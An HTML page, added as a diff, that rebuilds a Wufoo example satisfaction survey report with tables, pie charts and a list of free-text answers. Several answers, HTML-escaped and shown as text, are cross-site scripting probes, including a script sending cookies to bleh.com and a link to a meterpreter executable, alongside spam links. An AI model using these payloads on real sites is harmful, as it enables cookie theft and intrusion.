@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Example Satisfaction Survey Report | Wufoo</title>
+  <link rel="icon" type="image/x-icon"
+    href="data:image/png;base64,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" />
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <header>
+    <div id="navbar">
+      <nav><a href="https://www.wufoo.com"><img src="Images/wflogo-padding.png" alt="logo" title="Powered by Wufoo"></a>
+      </nav>
+    </div>
+  </header>
+  <section>
+    <div id="content">
+      <h2 class="describ">Example Satisfaction Survey Report</h2>
+      <p class="describ-para">This is my report. View it in all its glory!</p>
+      <hr style="border: dotted 0.5px; color: #b9b7b7;" />
+
+      <!--Box row-->
+      <div class="split">
+        <div class="left-side">
+          <div id="row">
+            <div class="column">
+              <h5>Entries</h5>
+              <h2 id="entries">8,211</h2>
+              <p class="box-bottom">Since Jun 2008</p>
+            </div>
+
+            <div class="column">
+              <h5>Views</h5>
+              <h2 id="views">128,817</h2>
+              <p class="box-bottom">Since Jun 2008</p>
+            </div>
+
+            <div class="column">
+              <h5>Conversion Rate</h5>
+              <h2 id="rate">6.37%</h2>
+              <p class="box-bottom">Since Jun 2008</p>
+            </div>
+          </div>
+          <!-- How Satisfied -->
+          <p class="tableheading">How satisfied?</p>
+          <table class="table1">
+            <div class="tablehead">
+              <tr class="no-hover" style="background-color: rgb(213, 212, 212)">
+                <td class="td">Choices</td>
+                <td class="td">Percentage</td>
+                <td style="text-align: center;">Count</td>
+              </tr>
+            </div>
+            <div>
+              <tr>
+                <th style="width: 380px;">Very Satisfied</th>
+                <td>
+                  <div id="very-satisfied"></div><span class="percentage"> 36.59%</span>
+                </td>
+            </div>
+            <td style="text-align: center; width: 90px;">1875</td>
+            </tr>
+            <tr>
+              <th>Satisfied</th>
+              <td>
+                <div id="satisfied"></div> <span class="percentage">23.80%</span>
+              </td>
+              <td style="text-align: center;">1220</td>
+            </tr>
+            <tr>
+              <th>Neutral</th>
+              <td>
+                <div id="neutral"></div> <span class="percentage">17.80%</span> 
+              </td>
+              <td style="text-align: center;">912</td>
+            </tr>
+            <tr>
+              <th>Unsatisfied</th>
+              <td>
+                <div id="unsatisfied"></div>  <span class="percentage">9.81%</span>
+              </td>
+              <td style="text-align: center;">503</td>
+            </tr>
+            <tr>
+              <th>Very unsatisfied</th>
+              <td>
+                <div id="very-unsatisfied"></div> <span class="percentage" >7.10%</span> 
+              </td>
+              <td style="text-align: center;">364</td>
+            </tr>
+            <tr>
+              <th>N/A</th>
+              <td>
+                <div id="na"></div> <span class="percentage">4.90%</span>
+              </td>
+              <td style="text-align: center;"> 251</td>
+            </tr>
+            <tr>
+              <th colspan="2" class="result">Total</th>
+              <td   style="text-align: center; font-weight: bold";> 5125</td>
+            </tr>
+            <tr>
+              <td colspan="2" class="result1" style="background-color: white;">Unanswered</td>
+              <td style="text-align: center; background-color: white; font-style: italic;">3086</td>
+            </tr>
+        </div>
+        </table>
+        <!--Satisfied By --><br>
+        <p class="tableheading">Satisfied by?</p>
+        <table class="table2">
+          <tr class="no-hover" style="background-color: rgb(213, 212, 212)" ;>
+            <td>Choices</td>
+            <td style="justify-items: last baseline;">Percentage</td>
+            <td style="text-align: center;">Count</td>
+          </tr>
+          <tr>
+            <th style="width: 380px;">Quality</th>
+            <td>
+              <div id="quality"></div>  <span class="percentage">20.12%</span>
+            </td>
+            <td style="text-align: center; width: 90px;">693</td>
+          </tr>
+          <tr>
+            <th>Price</th>
+            <td>
+              <div id="price"></div>  <span class="percentage"> 18.52%</span>
+            </td>
+            <td style="text-align: center;">638</td>
+          </tr>
+          <tr>
+            <th>Purchase Experience</th>
+            <td>
+              <div id="purchase"></div><span class="percentage">  14.81%</span>
+            </td>
+            <td style="text-align: center;">510</td>
+          </tr>
+          <tr>
+            <th>Installation or First Use Experience</th>
+            <td>
+              <div id="first-user"></div>  <span class="percentage"> 14.66% </span>
+            </td>
+            <td style="text-align: center;">474</td>
+          </tr>
+          <tr>
+            <th>Usage Experience</th>
+            <td>
+              <div id="user-experience"></div>   <span class="percentage"> 13.76%</span>
+            </td>
+            <td style="text-align: center;">474</td>
+          </tr>
+          <tr>
+            <th>Customer Service</th>
+            <td>
+              <div id="customer-service"></div><span class="percentage">   11.73%</span>
+            </td>
+            <td style="text-align: center;">404</td>
+          </tr>
+          <tr>
+            <th>Repeat Purchase Experience/th>
+            <td>
+              <div id="rpe"></div> <span class="percentage"> 6.39%</span>
+            </td>
+            <td style="text-align: center;">220</td>
+          </tr>
+          <tr>
+            <th colspan="2" class="result" style="background-color: white;">Total</th>
+            <td style="text-align: center; background-color: white; font-weight: bold;">3444</td>
+          </tr>
+          <tr>
+            <td colspan="2" class="result1 " >Unanswered</td>
+            <td style="text-align: center; font-style: italic;">4767</td>
+          </tr>
+        </table>
+
+      </div>
+      <!--Graph,Chart Column-->
+      <div class="right-side">
+        <p style="padding-top: 15px;">Use Again?</p>
+        <div class="pie1">
+          <img src="Images/piechart1.png" alt="piechart1">
+          <div id="use-again-pie">
+            <ul>
+              <li class="disc1"><span class="disc-content">Not sure</span> </li>
+              <li class="disc2"><span class="disc-content">Probably</span></li>
+              <li class="disc3"><span class="disc-content">Definitely</span></li>
+              <li class="disc4"><span class="disc-content">Probably Not</span></li>
+              <li class="disc5"><span class="disc-content">Definitely Not</span></li>
+            </ul>
+          </div>
+          <br>
+      
+          <p>How long?</p>
+          <div class="pie2">
+            <img src="Images/piechart2.png" alt="piechart2">
+            <div id="how-long-pie">
+              <ul>
+                <li class="disc1"><span class="disc-content">Less than a month</span></li>
+                <li class="disc2"><span class="disc-content">1-6 months</span></li>
+                <li class="disc3"><span class="disc-content">1-3 years</span></li>
+                <li class="disc4"><span class="disc-content">Over 3 Years</span></li>
+                <li class="disc5"><span class="disc-content">Never used</span></li>
+              </ul>
+            </div>
+          </div>
+          <br>
+
+          <br>
+
+          <p>How often?</p>
+          <div class="pie3"><img src="Images/piechart3.png" alt="piechart3">
+            <div id="how-often-pie">
+              <ul>
+                <li class="disc1">2 to 3 times a month</li>
+                <li class="disc2">Once a week</li>
+                <li class="disc3">Once a month</li>
+                <li class="disc4">Less than once a month</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    </div>
+    <br>
+
+    <!--Table 3-->
+
+    <div id="content">
+      <p>
+        What do you like?
+      </p><br>
+      <table>
+        <tr class="no-hover" style="background-color: rgb(213, 212, 212) " ;>
+          <td style="width: 138px; text-align: center;">#</td>
+          <td>Content</td>
+          <td style="width: 290px; text-align: center;">Date</td>
+        </tr>
+
+
+        <tr>
+          <th class="col1"> 8220 </th>
+          <td class="col2"> ttbt </td>
+          <td class="col3"> 1:09am · 2023-07-31 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8219 </th>
+          <td class="col2"> g </td>
+          <td class="col3"> 4:09pm · 2023-05-06 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8215 </th>
+          <td class="col2"> hallo </td>
+          <td class="col3"> 11:32pm · 2022-03-16 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8214 </th>
+          <td class="col2"> vvv </td>
+          <td class="col3"> 7:41am · 2021-08-06 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8213 </th>
+          <td class="col2"> many things </td>
+          <td class="col3"> 6:24pm · 2021-07-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8209 </th>
+          <td class="col2"> test </td>
+          <td class="col3"> 7:56am · 2020-11-30 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8207 </th>
+          <td class="col2"> test </td>
+          <td class="col3"> 1:29pm · 2020-04-27 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8205 </th>
+          <td class="col2"> Rocks </td>
+          <td class="col3"> 5:37pm · 2019-05-08 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8201 </th>
+          <td class="col2"> fun to use </td>
+          <td class="col3"> 9:23am · 2019-02-05 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8200 </th>
+          <td class="col2"> fun </td>
+          <td class="col3"> 3:17am · 2019-01-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8196 </th>
+          <td class="col2"> ss </td>
+          <td class="col3"> 10:40pm · 2018-10-09 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8192 </th>
+          <td class="col2"> Simplicity. </td>
+          <td class="col3"> 1:59am · 2018-07-30 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8185 </th>
+          <td class="col2"> Easy to use and set up. </td>
+          <td class="col3"> 9:22pm · 2018-01-22 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8184 </th>
+          <td class="col2"> The product is very hot </td>
+          <td class="col3"> 7:16am · 2018-01-09 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8179 </th>
+          <td class="col2"> asdasdas </td>
+          <td class="col3"> 1:23am · 2017-06-26 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8178 </th>
+          <td class="col2"> Gff </td>
+          <td class="col3"> 5:26am · 2017-03-27 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8173 </th>
+          <td class="col2"> czx </td>
+          <td class="col3"> 8:55am · 2016-12-16 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8169 </th>
+          <td class="col2"> like about it </td>
+          <td class="col3"> 8:09am · 2016-08-19 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8163 </th>
+          <td class="col2"> Not </td>
+          <td class="col3"> 8:46am · 2016-05-10 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8156 </th>
+          <td class="col2"> Everything is awesome </td>
+          <td class="col3"> 9:01am · 2015-10-28 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8154 </th>
+          <td class="col2">
+            &lt;form id=test onforminput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test
+            onformchange=alert(2)&gt;X&lt;/button&gt;
+          </td>
+          <td class="col3"> 6:28pm · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8152 </th>
+          <td class="col2"> ffascinate a nasty fair bit like current customers to purchase So don&apos;t solicitude to
+            purchase an infant 100% genuine Ugg boots [url=http://www.discountuggofficial.co.uk]ugg boots[/url] ugg
+            boots
+          </td>
+          <td class="col3"> 4:24am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8151 </th>
+          <td class="col2"> What's up, just wanted to tell you, I loved this article. It was funny. Keep on posting!
+            [url="javascript:prompt(100)"]karthic[/url] karthic </td>
+          <td class="col3"> 4:23am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8150 </th>
+          <td class="col2"> fascinate a nasty fair bit like current customers to purchase So don't solicitude to
+            purchase an infant 100% genuine Ugg boots [url=http://www.discountuggofficial.co.uk]ugg boots[/url]
+            javascript:prompt(100) </td>
+          <td class="col3"> 4:21am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8149 </th>
+          <td class="col2">
+            &lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1) meme, src=
+            http://dummy//onerror=eval(prompt(1))//
+            &apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;
+            alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
+            &gt;&quot;&gt;&apos;&gt; &quot;&gt;&lt;img src=x onerror=prompt(&apos;karthic&apos;)&gt; &lt;SCRIPT
+            SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt; &l
+            onload!#$%&amp;()*~+-_.,:;?@[/|\]^&grave;=alert(&quot;XSS&quot;)&gt; &lt;IMG
+            SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt; &lt;iframe src=javascript:alert() /&gt;
+            javascript:alert(1);///// &lt;IMG &raquo;&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SC
+            &raquo;RIPT&gt;&quot;&gt; &lt;sc&lt;script&gt;ript&lt; onmouseover= &raquo;prompt(document.domain)
+            &raquo;&lt;/sc&lt;/script&gt;ript&gt;&gt;
+            &quot;&gt;&lt;iMg%2fSrC%3d&quot;&quot;oNeRrOr%3dalert%2828678%29&gt;%5E%5E!%5E &lt;sc&lt;script&gt;ript&lt;
+            onmouseover= &raquo;prompt(document.domain) &raquo;&lt;/sc&lt;/script&gt;ript&gt;&gt;
+            loader-wizard.php?page=phpinfo &lt;img onmouseover=alert(1) onmouseout=alert(document.cookie) &gt;
+            &quot;&gt;&lt;svg/onload=prompt(123);&gt; &lt;script &gt;new
+            Image().src=&quot;bleh.com/xss.php?c=&quot;+encodeURI(document.cookie)&lt;/script&gt; &lt;input
+            type=&quot;text&quot; value=&grave;&grave;&lt;div/onmouseover=&apos;alert(1)&apos;&gt;X&lt;/div&gt;
+            http://www.&lt;script&gt;alert(1)&lt;/script .com &lt;svg&gt;&lt;script ?&gt;alert(1) &lt;form&gt;&lt;button
+            formaction=javascript&amp;colon;alert(1)&gt;CLICKME &lt;b onmouseover=alert(&apos;karthic!&apos;)&gt;click
+            me!&lt;/b&gt; &quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+            &lt;script&gt;alert(String.fromCharCode(120, 115, 115)&lt;/script&gt; &lt;img
+            src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt; &lt;IMG
+            SRC=j&amp;#X41vascript:alert(&apos;test2&apos;)&gt; &lt;meta http-equiv=&quot;refresh&quot;
+            content=&quot;0;url=javascript:confirm(1)&quot;&gt; </td>
+          <td class="col3"> 4:18am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8148 </th>
+          <td class="col2">&lt;a href=&quot;javascript:prompt(5000)&quot;&gt;Click to Download&lt;/a&gt;</td>
+          <td class="col3"> 4:13am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8147 </th>
+          <td class="col2">
+            &lt;form action=&quot;http://192.168.1.6/meterpeter.exe&quot; method=&quot;link&quot;&gt; &lt;img
+            src=&quot;http://192.168.1.6/alert.gif&quot;&gt; &lt;INPUT TYPE=submit value=&quot;karthic exe
+            meterpeter.exe&quot;&gt; &lt;/form&gt;&lt;html&gt;&lt;&gt;&lt;h10&gt;just some
+            instructions&lt;/h10&gt;&lt;/&gt;&lt;/html&gt;
+          </td>
+          <td class="col3"> 4:12am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8146 </th>
+          <td class="col2">
+            &lt;?php $name = $_GET[&apos;name&apos;]; echo &quot;Welcome $name&lt;br&gt;&quot;; echo &quot;&lt;a
+            href=&quot;javascript:prompt(5000)&quot;&gt;Click to Download&lt;/a&gt;&quot;; ?&gt;
+          </td>
+          <td class="col3"> 4:10am · 2015-09-15 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8138 </th>
+          <td class="col2"> asefawe </td>
+          <td class="col3"> 8:57pm · 2015-04-18 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8135 </th>
+          <td class="col2"> Meow! </td>
+          <td class="col3"> 3:07am · 2015-04-18 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8119 </th>
+          <td class="col2"> the product is well-built however, I had an issue with the software. i tried to find some
+            help
+            from the customer service but none of them are able to sort-out the problem </td>
+          <td class="col3"> 2:40pm · 2015-04-16 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8117 </th>
+          <td class="col2"> hvh,k,hkvhvhvm hk </td>
+          <td class="col3"> 1:18pm · 2015-04-16 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8101 </th>
+          <td class="col2"> nice product </td>
+          <td class="col3"> 1:37am · 2015-02-27 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8082 </th>
+          <td class="col2"> bghjd </td>
+          <td class="col3"> 8:04am · 2014-03-05 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8080 </th>
+          <td class="col2"> i love it, its so aweosme </td>
+          <td class="col3"> 4:59am · 2014-02-19 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8078 </th>
+          <td class="col2"> sd </td>
+          <td class="col3"> 6:57am · 2014-01-03 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8077 </th>
+          <td class="col2"> Yea </td>
+          <td class="col3"> 2:53am · 2013-10-01 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8074 </th>
+          <td class="col2"> frf </td>
+          <td class="col3"> 8:52am · 2013-07-02 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8072 </th>
+          <td class="col2"> I just have many world of tanks power leveling
+            http://www.u7buy.com/world-of-tanks/world-of-tanks-power-leveling.html in your destroyed coloring with
+            regards to love it. they are perfect for Wi winter snow storms! I&apos;ve had world of tanks power leveling
+            http://www.u7buy.com/world-of-tanks/world-of-tanks-power-leveling.html during days gone by nevertheless do
+            not a new leather form. I are thinking about the way to get rid of it. they seem to only become scratched as
+            well as a great deal more set on. Is there that is to defend these items? Every one of the world of tanks
+            power leveling http://www.u7buy.com/world-of-tanks/world-of-tanks-power-leveling.html health care mention
+            that it is usually needed for ugg. warm regards </td>
+          <td class="col3"> 6:16pm · 2013-06-29 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8066 </th>
+          <td class="col2"> Loved the positive upbeat attitude of the women sales associates in the Women's Dept. I was
+            more
+            knowledgable about what I wanted but the service to help me achieve my personal goals was extremely good.
+            Koodoes to Selene, Sara especially, and Sandy who provided me with the service best at the finalization of
+            my
+            day. I enjoyed Tammi in the watch department who guided me through my purchase of two purchases. </td>
+          <td class="col3"> 5:58pm · 2013-05-31 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8058 </th>
+          <td class="col2"> yttut </td>
+          <td class="col3"> 1:03am · 2013-04-19 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8051 </th>
+          <td class="col2"> tyhnj </td>
+          <td class="col3"> 4:12pm · 2013-03-06 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8050 </th>
+          <td class="col2"> The staff was friendly and compitent. We enjoyed the food, the atmosphere, and the total
+            experience. </td>
+          <td class="col3"> 1:54pm · 2013-03-02 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8042 </th>
+          <td class="col2"> abcd </td>
+          <td class="col3"> 9:58pm · 2013-01-31 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8041 </th>
+          <td class="col2"> yadda </td>
+          <td class="col3"> 3:52am · 2013-01-29 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8032 </th>
+          <td class="col2"> test </td>
+          <td class="col3"> 4:25pm · 2013-01-25 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8007 </th>
+          <td class="col2"> fascinate a nasty fair bit like current customers to purchase So don&apos;t solicitude to
+            purchase an infant 100% genuine Ugg boots [url=http://www.discountuggofficial.co.uk]ugg boots[/url]<a
+              href="http://www.discountuggofficial.co.uk/" title="ugg book">ugg boots</a> </td>
+          <td class="col3"> 9:13am · 2013-01-21 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8002 </th>
+          <td class="col2"> Nothing </td>
+          <td class="col3"> 12:43am · 2013-01-21 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8001 </th>
+          <td class="col2">
+            Nowadays safe transfer of flammable fluids like kerosene, diesel, petrol etc is possible safely and
+            accurately by the invention of various fuel dispensing equipments Isaiah 55:8-9KJV The heart is deceitful
+            above all things, and desperately wicked: who can know it? I the LORD search the heart, I try the reins,
+            even to give every man according to his ways, and according to the fruit of his doings Jeremiah 17:9-11KJV
+            The scriptures in Jeremiah 10:23 revealed the way of man: O LORD, I know that the way of man is not in
+            himself: it is not in man that walketh to direct his steps Many such anger management classes teach a person
+            how to have better anger control and as a result to improve their relationships and minimize conflictThe
+            Quiz has made the news several times, as it has been used as a libertarian outreach tool around the United
+            States of America and whole world [url=http://www.onsale49ersonline.com]Vernon Davis Jersey[/url]<a
+              href="http://www.onsale49ersonline.com/" title="Vernon Davis Jersey">Vernon Davis Jersey</a>
+          </td>
+          <td class="col3"> 11:57pm · 2013-01-20 </td>
+        </tr>
+        <tr>
+          <th class="col1"> 8000 </th>
+          <td class="col2"> Hello, just wanted to tell you, I loved this blog post. It was inspiring!
+            [url=http://www.officialstyle49ers.com] Crabtree jersey[/url] <a href="http://www.officialstyle49ers.com/"
+              title="Michael Crabtree jersey">Michael Crabtree jersey</a>
+          <td class="col3"> 9:14pm · 2013-01-20 </td>
+        </tr>
+        <tr>
+          <td colspan="3" id="view-more">
+            <a href="https://examples.wufoo.com/widgets/h6mjucf0pguf64/">[View more]</a>
+          </td>
+        </tr>
+
+        <tr>
+          <th colspan="2" class="result" style="background-color: white;"> Total </th>
+          <th  style="background-color: white"; class="total" > 1555 </th>
+        </tr>
+
+        <tr>
+          <td colspan="2" class="result1"> Unanswered </td>
+          <td  class="total" style="font-style: italic;">6656 </td>
+        </tr>
+      </table>
+    </div>
+    <!--footer-->
+    <div id="date">
+      <h6>Example Satisfaction Survey Report</h6>
+      <p class="date-footer">Sep 4, 2024 · 5:17 PM</p>
+    </div><br>
+  </section>
+  <footer>
+    <div  class="footerpic" >
+    <img src="Images/lastimage.png" alt="image" >
+  </div>
+  </footer>
+</body>
+
+</html>
